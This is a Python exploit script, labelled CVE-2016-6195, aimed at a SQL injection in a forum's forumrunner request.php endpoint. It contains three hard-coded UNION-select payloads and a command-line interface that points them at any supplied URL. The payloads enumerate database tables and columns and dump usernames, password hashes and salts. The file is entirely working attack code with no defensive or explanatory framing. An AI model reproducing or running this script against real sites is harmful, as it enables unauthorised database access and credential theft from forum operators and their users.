import requests
import re
import os
import argparse
from bs4 import BeautifulSoup


exploit = ["/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (@x:=concat(@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -",
            "/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (information_schema.columns)where (table_name=0x75736572) and (0x00) in (@x:=concat(@x,0x3c62723e,column_name))))x),5,6,7,8,9,10-- -",
            "//forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (@x) from (select (@x:=0x00),(select (0) from (user)where (0x00) in (@x:=concat(@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -"]


parser = argparse.ArgumentParser(description="CVE-2016-6195 exploit")
parser.add_argument('--url', type=str, help="Enter url", required=True)
parser.add_argument('--dump', type=int, help="""
1.) Enumerate Tables
2.) Enumerate Columns
3.) Dump Users,Password & Hash/Salt
""", required=True, choices=[1,2,3])
parser.add_argument('--table', type=str, help="Enter table name")
parser.add_argument('--column', type=str, help="Enter column name")
args = parser.parse_args()


def main():
    try:
        rq = requests.get(args.url)
        if rq.status_code == 200:
            run_exploit(args.url)
        else:
            print(f"{args.url} returned status code: {rq.status_code}")
    except Exception:
        print("Website failed")

def run_exploit(website):
    os.system('cls')
    try:
        if args.dump == 1:
            page = requests.get(f"{website}{exploit[0]}")
            soup = BeautifulSoup(page.content, "html.parser")
            elements = soup.find("div", class_='blockrow restore')
            for i in elements.find_all("br"):
                i.unwrap()
            content = elements.contents
            for lines in content:
                print(lines)

        elif args.dump == 2:
            if args.table is not None:
                hexadecimal = args.table.encode('utf-8').hex()
                replaced = exploit[1].replace("0x75736572", f"0x{hexadecimal}")
                page = requests.get("{}{}".format(website, replaced))
                soup = BeautifulSoup(page.content, "html.parser")
                elements = soup.find("div", class_='blockrow restore')
                for element in elements.find_all("br"):
                    element.unwrap()
                content = elements.contents
                for lines in content:
                    print(lines)
            else:
                page = requests.get(f"{website}{exploit[1]}")
                soup = BeautifulSoup(page.content, "html.parser")
                elements = soup.find("div", class_='blockrow restore')
                for element in elements.find_all("br"):
                    element.unwrap()
                content = elements.contents
                for lines in content:
                    print(lines)

        elif args.dump == 3:
            if args.column is not None:
                replaced = re.sub(r'\buser\b', f"{args.column}", exploit[2])
                page = requests.get("{}{}".format(website, replaced))
                soup = BeautifulSoup(page.content, "html.parser")
                elements = soup.find("div", class_='blockrow restore')
                for i in elements.find_all("br"):
                    i.unwrap()
                content = elements.contents
                for lines in content:
                    print(lines)
            else:
                page = requests.get(f"{website}{exploit[2]}")
                soup = BeautifulSoup(page.content, "html.parser")
                elements = soup.find("div", class_='blockrow restore')
                for element in elements.find_all("br"):
                    element.unwrap()
                content = elements.contents
                for lines in content:
                    print(lines)
    except AttributeError:
        print("Website is not vulnerable")


main()
